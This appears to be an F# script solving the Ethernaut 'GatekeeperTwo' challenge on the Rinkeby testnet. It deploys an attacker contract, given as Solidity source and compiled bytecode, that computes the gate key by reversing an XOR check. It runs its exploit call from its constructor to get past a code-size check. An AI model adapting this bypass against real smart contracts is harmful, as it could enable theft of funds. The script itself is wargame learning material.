#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env =createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// My instance: 0xb68b0D0365E05baeA965555F958Baa3AE81bA74b

let gateKeeper2ABI = """[{"inputs":[{"internalType":"bytes8","name":"_gateKey","type":"bytes8"}],"name":"enter","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"entrant","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI
let gateKeeper2 = loadDeployedContract env "0xb68b0D0365E05baeA965555F958Baa3AE81bA74b" RINKEBY gateKeeper2ABI |> bindDeployedContract |> List.head

// Okay, so I mostly got this on my own, and then peeked the answer because it looked like I was going to have to use the create2 opcode in order to 
// know ahead of time what my address was going to be, and I had no idea how to do that (and the stuff showing it looked like a pain in the ass, with
// factory contracts, etc).

// Except, that isn't true. While this all has to live in the constructor in order to get past the bytecode size check, apparently even at this 
// point in execution, the contract knows what its address is. Sigh.

(*
    contract gateTourist2 {
    
    constructor() public {
        GatekeeperTwo gatr = GatekeeperTwo(0xb68b0D0365E05baeA965555F958Baa3AE81bA74b);
        bytes8 key = (bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1)); // do the reverse of what the check does, XOR is reversible
        address(gatr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
*)

// Since this fires on the constructor, check the state beforehand
call gateKeeper2 (ByString "entrant") [] |> env.log Log


let gateTourist2bytecode = """608060405234801561001057600080fd5b50600073b68b0d0365e05baea965555f958baa3ae81ba74b90506000600160000330604051602001808273ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1860c01b90508173ffffffffffffffffffffffffffffffffffffffff1681604051602401808277ffffffffffffffffffffffffffffffffffffffffffffffff191681526020019150506040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016d578051825260208201915060208101905060208303925061014a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101cf576040519150601f19603f3d011682016040523d82523d6000602084013e6101d4565b606091505b5050505050603f806101e76000396000f3fe6080604052600080fdfea2646970667358221220e4db22577baee82afa0f8ef3bd0d9d40340eea47366491e24ae3157815d7499664736f6c634300060c0033""" |>RawContractBytecode
let gateTourist2ABI = """[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"}]""" |> ABI

prepareUndeployedContract env gateTourist2bytecode None RINKEBY gateTourist2ABI
|> Result.bind( deployEthContract env ZEROV)
|> env.log Log

// check afterwards
call gateKeeper2 (ByString "entrant") [] |> env.log Log
